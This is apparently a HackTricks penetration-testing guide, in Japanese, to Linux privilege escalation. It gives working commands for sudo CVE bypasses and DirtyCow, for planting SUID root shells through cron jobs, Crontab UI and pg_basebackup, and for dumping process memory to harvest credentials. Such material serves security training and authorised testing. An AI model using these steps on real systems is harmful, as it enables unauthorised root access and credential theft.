# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

より広い背景情報や歴史的な列挙ワークフローについては、Referencesに記載されているg0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-iのリソースを参照してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## システム情報

### OS情報

まず、実行中のOSについて情報を集めましょう。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

`PATH` 変数内のいずれかのフォルダに**書き込み権限がある場合**、ライブラリやバイナリを乗っ取れる可能性があります。

```bash
echo $PATH
```

### 環境情報

環境変数に興味深い情報、パスワード、または API キーはありますか？

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

カーネルのバージョンを確認し、権限昇格に利用できるexploitがあるか調べます。

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md)には、ローカル権限昇格の事例と、Binary ExploitationにあるLinuxカーネルの詳細な解説へのリンクがまとめられています。事例を試す前に、対象のビルドと設定を確認してください。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

脆弱なkernelの一覧と、すでに**コンパイル済みのexploit**はこちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
**コンパイル済みのexploit**を見つけられる他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのWebサイトから脆弱なkernelのバージョンをすべて抽出するには、次のようにします:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

kernel exploitの検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim上で実行。kernel 2.x向けのexploitのみをチェック)

**必ずGoogleでkernel versionを検索してください**。kernel versionがkernel exploitに記載されている場合があり、そのexploitが有効だと確認できます。

その他のkernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

LinuxのPrivilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づき:

```bash
searchsploit sudo
```

この grep を使って、sudo のバージョンに脆弱性があるか確認できます。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

上流版の sudo **1.9.14 から 1.9.17** では、sudo がユーザーの制御下にあるディレクトリから `/etc/nsswitch.conf` を読み込む際に、権限のないローカルユーザーが `--chroot` オプションを使って root に昇格できます。上流では **1.9.17p1** で修正されています。`sudo -V` が報告するのは `PATH` によって選択されたバイナリだけなので、該当するパスにある root-setuid の実行可能な sudo バイナリをすべて確認してください。ディストリビューションのパッケージでは、上流のバージョン文字列を変更せずに修正がバックポートされている場合があるため、ベンダーのパッケージ状況も確認してください。[sudo メンテナーのアドバイザリー](https://www.openwall.com/lists/oss-security/2025/06/30/3)を参照してください。<sup>[[28]](#references)[[29]](#references)</sup>

この[脆弱性](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)を悪用するための [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)があります。exploit を実行する前に、お使いの `sudo` のバージョンに脆弱性があり、`chroot` 機能をサポートしていることを確認してください。

詳細については、オリジナルの[脆弱性アドバイザリー](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)を参照してください。<sup>[[28]](#references)</sup>

### Sudo のホストベースルールのバイパス（CVE-2025-32462）

上流版の sudo **1.8.8 から 1.9.17** では、ホストベースの sudoers ルールを評価する際に、**実際のホスト名**ではなく、`sudo -h <host>` で指定された**ユーザー提供のホスト名**が使われる場合があります。上流では **1.9.17p1** で修正されています。ただし、選択したホストでユーザーに一致する sudoers エントリが必要です。ローカルのポリシーに加え、ベンダーによるバックポートや別の sudo バイナリも確認してください。[sudo メンテナーのアドバイザリー](https://www.openwall.com/lists/oss-security/2025/06/30/2)を参照してください。<sup>[[29]](#references)</sup>

要件:
- 脆弱性のある sudo バージョン
- ホスト固有の sudoers ルール（ホストが現在のホスト名でも `ALL` でもないこと）

sudoers の設定例:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

許可されたホストを spoofing して exploit する:

```bash
sudo -h devbox id
sudo -h devbox -i
```

選択した名前の解決がブロックされる場合は、その名前がホスト上でどのように解決されるかを確認してください。ログや設定ファイルに名前が記載されているだけでは解決可能とは限りません。また、`/etc/hosts` の変更には通常、特権を持つ書き込みアクセスが必要です。

#### sudo < v1.8.28

この[上流版のRunas UID bypass](https://ubuntu.com/security/CVE-2019-14287)には、rootを除外しつつ、`ALL`ユーザーとしてコマンドを実行できる有効なsudoルールが必要です。たとえば、`(ALL, !root) /bin/bash`のようなルールです。呼び出し元も、認証要件を含め、そのルールを使用できる必要があります。インストール済みパッケージのセキュリティ勧告を確認してください。ベンダーは、表示上の上流バージョンが1.8.28未満のリリースにも修正をバックポートしています。`!root`ルールや古いバージョンだけでは、脆弱性の存在は確認できません。パッシブな列挙中に特権コマンドをテストしないでください。

```
sudo -u#-1 /bin/bash
```

### Dmesg の署名検証に失敗

この vuln の悪用例については、HTB の **smasher2 box** を確認してください。

```bash
dmesg 2>/dev/null | grep "signature"
```

### システムのさらなる情報収集

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 考えられる防御策を列挙する

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

コンテナ内にいる場合は、まず以下のコンテナセキュリティのセクションを確認し、その後ランタイム固有の悪用ページに進んでください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ドライブ

**何がどこに、なぜマウントまたはアンマウントされているか**を確認してください。アンマウントされているものがあれば、マウントしてプライベートな情報がないか確認してみてください。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 便利なソフトウェア

便利なバイナリを列挙する

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

また、**コンパイラがインストールされているか確認してください**。kernel exploitを使う必要がある場合に役立ちます。使用するマシン（または同様の環境）でコンパイルすることをおすすめします。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### インストールされている脆弱なソフトウェア

**インストールされているパッケージやサービスのバージョン**を確認してください。たとえば、古いバージョンのNagiosがあり、権限昇格に悪用できる可能性があります。\
疑わしいソフトウェアについては、バージョンを手動で確認することをおすすめします。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSH accessでマシンに接続できる場合は、**openVAS**を使って、マシンにインストールされている古いソフトウェアや脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドでは大量の情報が表示され、その大半は役に立ちません。そのため、インストール済みソフトウェアのバージョンに既知のexploitに対する脆弱性がないか確認するOpenVASなどのアプリケーションを使うことをおすすめします_

## プロセス

実行中の**プロセス**を確認し、必要以上の**権限を持つプロセス**がないか調べましょう（たとえば、rootで実行されているtomcatなど）。

```bash
ps aux
ps -ef
top -n 1
```

常に [**electron/cef/chromium debuggers** が実行中でないか](../../software-information/electron-cef-chromium-debugger-abuse.md)確認してください。これを悪用して権限昇格できる可能性があります。**Linpeas** は、プロセスのコマンドライン内にある `--inspect` パラメータをチェックして検出します。\
また、**プロセスのバイナリに対する自分の権限も確認してください**。誰かのバイナリを上書きできるかもしれません。

### ユーザーをまたぐ親子プロセスの連鎖

親プロセスとは**別のユーザー**で実行される子プロセスは、必ずしも悪意あるものではありませんが、有用な**トリアージシグナル**です。想定内のユーザー切り替えもあります（`root` がサービスユーザーのプロセスを起動する、ログインマネージャーがセッションプロセスを作成するなど）。一方、通常とは異なる連鎖から、ラッパー、デバッグヘルパー、永続化、または弱いランタイム信頼境界が見つかることがあります。

簡単な確認:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

意外な chain を見つけた場合は、親プロセスのコマンドラインと、その動作に影響するすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な引数）を調べてください。実際の privesc 事例では、子プロセス自体は書き込み可能ではなくても、**親が制御する config** や helper chain が攻撃経路になっていました。

### 削除された実行ファイルと、削除後も開かれているファイル

Runtime artifacts は、削除**後も**アクセスできることがよくあります。これは、権限昇格だけでなく、すでに機密ファイルを開いているプロセスから証拠を復元する際にも役立ちます。

削除された実行ファイルを確認してください：

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスは古いバイナリイメージをメモリから実行し続けています。これは調査すべき強い兆候です。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、今も有用なファイルディスクリプターを公開している可能性がある
- 特権バイナリが削除されている場合、最近の改ざんや痕跡消去の試みを示している可能性がある

削除済みで開かれているファイルをシステム全体から収集します。

```bash
lsof +L1
```

興味深いディスクリプタを見つけたら、直接取得してください:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

これは、プロセスが削除済みの秘密情報、スクリプト、データベースのエクスポート、またはフラグファイルを開いたままにしている場合に、特に役立ちます。

### プロセスの監視

プロセスの監視には[**pspy**](https://github.com/DominicBreuker/pspy)などのツールを使用できます。頻繁に実行される脆弱なプロセスや、一定の要件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

#### sudoでのLinux ProcMon

[Linux版ProcMon](https://github.com/microsoft/ProcMon-for-Linux)は、選択したプロセスやシステムコールをトレースし、SQLiteのトレースとして保存できます。`sudo -l`で制限のないroot権限で実行可能な`procmon`コマンドが許可されている場合、他のユーザーのプロセスの入力や出力を監視できる可能性があるか検討してください。この権限は調査の手がかりにすぎません。トレーサーのサポート状況、有効なポリシー、適切なプロセスが実際に動作しているかどうかが関係します。トレースファイルには秘密情報が含まれる場合があるため、許可されたエクスポートを慎重に調査し、無関係なプロセスの情報収集は避けてください。

### プロセスメモリ

サーバーのサービスの中には、**メモリ内に認証情報を平文で保存するもの**があります。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**root権限**が必要です。そのため、これは一般に、すでにrootであり、さらに認証情報を見つけたい場合に役立ちます。\
ただし、**一般ユーザーでも、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在では、ほとんどのマシンで**デフォルトではptraceが許可されていません**。そのため、権限のないユーザーが所有する他のプロセスをダンプできない場合があります。
>
> ptraceへのアクセス可否は、ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ で制御されます。
>
> - **kernel.yama.ptrace_scope = 0**: 同じuidであれば、すべてのプロセスをデバッグできます。これは従来のptraceの動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capabilityが必要なため、管理者のみがptraceを使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptraceによるトレースは一切できません。一度設定すると、再びptraceを有効にするには再起動が必要です。

一時的にパスワード保管庫のロックを解除する同じUIDのプロセスは、別個の認証情報境界になり得ます。トレースが許可されている場合、動作中でダンプ可能なプロセスから、入力システムコールやメモリを通じて保管庫のパスワードが漏れる可能性があります。暗号化された保管庫ファイル自体は保護されたままでも同様です。`ptrace_scope=0`は前提条件の一つにすぎません。認証情報の一致、対象のダンプ可能性、他のLinuxセキュリティモジュール、プロセスの存続期間も関係します。保管庫のエントリをUnixのrootログインに使えるかどうかは、別途、認証情報の再利用を確認する必要があります。通常の列挙では、ポリシーと候補となるプロセスまたは保管庫のパスを報告し、入力を収集したり秘密情報を表示したりしないでください。[kernelのYamaドキュメント](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html)と[ptraceのアクセスチェック](https://man7.org/linux/man-pages/man2/ptrace.2.html)を参照してください。

#### GDB

たとえばFTPサービスのメモリにアクセスできる場合、そのHeapを取得し、認証情報を検索できます。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDBスクリプト

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も示します。**mem** 疑似ファイルは、**プロセスのメモリそのものを公開します**。**maps** ファイルから、**読み取り可能なメモリ領域**とそのオフセットが分かります。この情報を使って、**mem ファイル内の該当位置にシークし、読み取り可能な領域をすべてファイルにダンプします**。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` の読み取りが許可されているのは **root** と **kmem** グループだけです。

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux 向け ProcDump

ProcDump は、Windows 用 Sysinternals ツールスイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### ツール

プロセスのメモリをダンプするには、次を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) のスクリプト A.5 (rootが必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticatorプロセスが実行中であることがわかった場合：

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリ**や一部の**よく知られたファイル**から平文の認証情報を盗み出します。正常に動作させるには root 権限が必要です。

| 機能                                             | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali デスクトップ、Debian デスクトップ） | gdm-password         |
| Gnome Keyring（Ubuntu デスクトップ、ArchLinux デスクトップ） | gnome-keyring-daemon |
| LightDM（Ubuntu デスクトップ）                    | lightdm              |
| VSFTPd（アクティブな FTP 接続）                    | vsftpd               |
| Apache2（アクティブな HTTP Basic 認証セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 正規表現の検索/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## スケジュール/Cronジョブ

### rootで実行されるCrontab UI (alseambusher) – Webベースのschedulerによるprivesc

Web版「Crontab UI」パネル (alseambusher/crontab-ui) がrootで実行され、loopbackのみにバインドされている場合でも、SSHのローカルポートフォワーディング経由でアクセスし、特権ジョブを作成して権限昇格できます。<sup>[[1]](#references)[[4]](#references)</sup>

典型的な流れ
- loopback限定のポート（例: 127.0.0.1:8000）とBasic-Auth realmを特定する（`ss -ntlp` / `curl -v localhost:8000`）
- 運用関連のファイルから認証情報を探す:
  - `zip -P <password>` を含むバックアップ/スクリプト
  - `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開しているsystemdユニット
- トンネルを作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即座に実行する（SUID shellを配置）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する：
```bash
/tmp/rootshell -p   # root shell
```

強化
- Crontab UIをrootとして実行しない。専用ユーザーを使い、権限を最小限に制限する
- localhostにバインドし、さらにfirewall/VPNでアクセスを制限する。パスワードを使い回さない
- unit filesにsecretを埋め込まない。secret storeまたはrootのみが読み取れるEnvironmentFileを使う
- オンデマンドのジョブ実行に対するaudit/loggingを有効にする

スケジュールされたジョブに脆弱性がないか確認してください。rootで実行されるスクリプトを悪用できるかもしれません（wildcard vuln？rootが使うファイルを変更できる？symlinkを使える？rootが使うディレクトリに特定のファイルを作れる？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` が使われている場合、実際に実行される名前を確認してください。

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

これにより false positive を防げます。書き込み可能な定期実行ディレクトリが役立つのは、payload のファイル名がローカルの `run-parts` のルールに一致する場合だけです。

### Cron path

たとえば、_/etc/crontab_ の中に PATH が記載されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー「user」が /home/user に対する書き込み権限を持っていることに注目してください）

この crontab 内で root ユーザーが、パスを指定せずにコマンドやスクリプトを実行しようとした場合、たとえば _\* \* \* \* root overwrite.sh_ のように記述されていれば、次の方法で root shell を取得できます:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cronでワイルドカードを含むスクリプトを使用する（Wildcard Injection）

rootによって実行されるスクリプトのコマンド内に「**\***」が含まれている場合、これを悪用して予期しないこと（privescなど）を引き起こせる可能性があります。例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**wildcard の前に** _**/some/path/\***_ **のようなパスがある場合、脆弱ではありません（** _**./\***_ **の場合も同様です）。**

wildcard を悪用するその他のテクニックについては、以下のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron のログパーサーにおける Bash 算術展開インジェクション

Bash の算術式では、信頼できないテキストが式として解釈されることがあります。影響を受ける Bash のコンテキストでは、その式の中にある配列の添字によってコマンド置換が評価される場合があります。特権で動作する cron/parser が、攻撃者に制御されたログテキストをこのような算術比較に渡すと、置換がパーサーの実行ユーザー権限で実行される可能性があります。<sup>[[22]](#references)</sup> これは正確な Bash の式とバージョンに依存します。展開された変数内に単独である `$(...)0` という文字列があっても、それだけで再評価が確実に起きるわけではありません。

入力は、ファイルのメタデータや、ユーザーが書き込み可能な場所から読み込まれる別のフィールドに由来することもあります。たとえば、特権で動作するクリーンアップスクリプトが画像の `Producer` タグを読み取り、`[[ "$producer" -eq "expected" ]]` と比較する場合、変数が引用符で囲まれていても算術比較が行われます。スケジュールされた処理の実行ユーザー、タグの入力元となり得るファイル、比較前の変換、そして正確な Bash の挙動を確認してください。テキストラベルには文字列比較を使用し、数値には算術演算を行う前に入力が10進数の数字のみであることを検証してください。[Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) を参照してください。

- 典型的な脆弱パターン:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- 配列添字メカニズムの安全なローカル動作プローブ（特権プロセスやファイルの変更なし）：
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

実際にスケジュールされているスクリプトと、そのスクリプトが開くリテラルな入力パスを追跡してください。ログファイル自体に書き込めなくても、sticky bit が設定されていない親ディレクトリに書き込みと検索の権限があれば、そのディレクトリエントリを置き換えられる場合があります。`namei -l` を使うと、これらの権限を見分けるのに役立ちます。別の書き込み可能なログパス、読み取れないスケジューラ、またはそのフィールドを Bash の算術式として評価しないパーサでは、この経路が成立することの証明にはなりません。

### Cron script の上書きと symlink

root で実行される **cron script を変更できる**場合、簡単に shell を取得できます:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

rootによって実行されるscriptが**あなたが完全にアクセスできるディレクトリ**を使っている場合、そのフォルダを削除し、**別の場所へのsymlinkフォルダを作成して**、あなたが制御するscriptを配置すると役立つかもしれません。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink の検証とより安全なファイル処理

パスを指定してファイルを読み書きする特権付きスクリプトやバイナリを確認する際は、リンクがどのように処理されるかを検証してください。

- `stat()` は Symlink をたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` を使うと、最終的なリンク先を解決し、パスの各構成要素の権限を確認できます。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

防御者や開発者がシンボリックリンク攻撃を防ぐために使える、より安全なパターンは次のとおりです。

- `O_EXCL` と `O_CREAT`：パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンクやファイルを防ぐ）。
- `openat()`：信頼できるディレクトリのファイルディスクリプタを基準に操作する。
- `mkstemp()`：安全な権限で一時ファイルをアトミックに作成する。

### 書き込み可能なペイロードを持つカスタム署名付き cron バイナリ
root の cron job が実行するバイナリそのものに書き込める一般ユーザーは、権限境界を越えられる可能性があります。ただし、カスタム署名チェックにより、署名のない置き換えを拒否できる場合があります。記録された事例では、root 所有の ELF のモードは `0760` で、root 所有者が実行できる一方、そのグループのメンバーは書き込み可能でした。表示されたプロセストレースによると、job がバイナリを実行する前に `objcopy` が `.text_sig` を抽出していました。検証スクリプト全体は閲覧できませんでした。<sup>[[2]](#references)</sup>

成功した置き換えには、leaked private signing material を使い、ELF signer で署名が付けられていました。その[フォーマットのドキュメント](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)では、実行ファイルの `.text` から生成される署名セクションについて説明されています。証明書や一致する文字列を `.text_sig` に追加するだけで、確認できない検証処理を通過できるとは示されていません。書き込み可能な署名付きバイナリが悪用可能だと判断する前に、実際にスケジュールされているパス、実効的な書き込み権限、root による実行、および検証ポリシーを確認してください。`.text_sig` セクションがあること自体は、調査の手がかりにすぎません。

### 頻繁に実行される cron job

1、2、5 分ごとに実行されるプロセスを探すために、プロセスを監視できます。そこを利用して権限昇格できるかもしれません。

たとえば、**1 分間、0.1 秒ごとに監視**し、**実行回数の少ないコマンド順に並べ**、最も多く実行されたコマンドを削除するには、次のようにします。

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**また、** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **も使用できます**（起動するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root バックアップ（pg_basebackup）

root 所有の cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー処理）を実行する場合、**SUID/SGID バイナリ**を仕込めば、同じ mode bits のままバックアップ先に **root:root** として再コピーされます。<sup>[[26]](#references)</sup>

一般的な発見手順（低権限の DB ユーザーとして）:
- `pspy` を使い、root の cron が毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを実行していることを確認します。
- ソースクラスター（例: `/var/lib/postgresql/14/main`）に書き込み可能であること、またジョブの実行後に保存先（`/opt/backups/current`）の所有者が root になることを確認します。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

これは、`pg_basebackup` がクラスターのコピー時にファイルモードビットを保持するためです。root が実行すると、コピー先のファイルは **root 所有権 + 攻撃者が指定した SUID/SGID** を引き継ぎます。権限を保持し、実行可能な場所に書き込む同様の特権バックアップ／コピー処理は、いずれも脆弱です。

### 見えない cron jobs

コメントの後にキャリッジリターン（改行文字なし）を入れて cronjob を作成できます。その cron job は正常に動作します。例（キャリッジリターン文字に注意）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

この種の隠蔽されたエントリを検出するには、制御文字を表示できるツールを使って cron ファイルを調べます:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルに書き込み可能か確認してください。可能であれば、サービスの**起動**、**再起動**、または**停止**時に backdoor を**実行する**ように変更できます（マシンが再起動されるまで待つ必要があるかもしれません）。\
